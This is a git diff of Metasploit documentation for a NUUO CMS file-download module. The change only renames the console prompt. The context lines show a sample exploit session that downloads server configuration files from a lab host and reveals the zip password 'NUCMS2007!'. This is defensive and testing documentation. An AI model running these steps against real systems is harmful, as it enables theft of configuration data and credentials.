@@ -46,9 +46,9 @@ The following versions were tested:
 ### Tested on Windows 10 Pro x64 running NCS Server 2.4.0
 
 ```
-msf5 auxiliary(gather/nuuo_cms_file_download) > set rhosts 172.22.222.200
+msf auxiliary(gather/nuuo_cms_file_download) > set rhosts 172.22.222.200
 rhosts => 172.22.222.200
-msf5 auxiliary(gather/nuuo_cms_file_download) > exploit
+msf auxiliary(gather/nuuo_cms_file_download) > exploit
 
 [+] 172.22.222.200:5180 - Downloaded file to /home/msfdev/.msf4/loot/20190219064923_default_172.22.222.200_CMServer.cfg_227185.cfg
 [+] 172.22.222.200:5180 - Downloaded file to /home/msfdev/.msf4/loot/20190219064923_default_172.22.222.200_ServerConfig.cfg_050084.cfg
@@ -59,5 +59,5 @@ msf5 auxiliary(gather/nuuo_cms_file_download) > exploit
 [*] 172.22.222.200:5180 - password NUCMS2007! to unzip them.
 [*] 172.22.222.200:5180 - Annoy the Metasploit developers until this gets fixed!
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/nuuo_cms_file_download) >
+msf auxiliary(gather/nuuo_cms_file_download) >
 ```
